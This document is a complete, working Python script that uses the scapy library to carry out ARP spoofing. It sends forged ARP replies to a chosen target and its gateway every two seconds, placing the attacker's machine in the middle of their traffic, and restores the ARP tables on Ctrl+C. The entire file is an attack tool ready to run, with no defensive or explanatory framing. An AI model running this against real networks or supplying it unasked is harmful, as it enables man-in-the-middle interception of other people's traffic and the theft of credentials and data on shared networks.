#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="Target IP")
    parser.add_argument("-g", "--gateway_ip", dest="gateway_ip", help="Gateway IP")

    return parser.parse_args()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Packets sent : " + str(packets_sent_count), flush=True),
        #sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Resetting ARP tables .. Please Wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
